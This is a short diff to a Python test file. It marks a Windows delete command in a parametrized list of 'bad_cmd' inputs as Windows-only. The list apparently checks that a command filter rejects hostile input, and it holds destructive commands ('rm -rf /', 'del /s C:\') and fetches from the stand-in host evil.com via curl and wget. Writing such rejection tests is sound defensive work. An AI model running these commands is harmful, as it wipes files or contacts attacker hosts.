@@ -195,7 +195,7 @@ def test_run_test_accepts_pytest(workspace_tree, clean_env, audit_override, monk
     "bad_cmd",
     [
         "rm -rf /",
-        "del /s C:\\",
+        pytest.param("del /s C:\\", marks=pytest.mark.skipif(sys.platform != "win32", reason="Windows-only command")),
         "powershell -c bad",
         "curl http://evil.com",
         "wget http://evil.com",
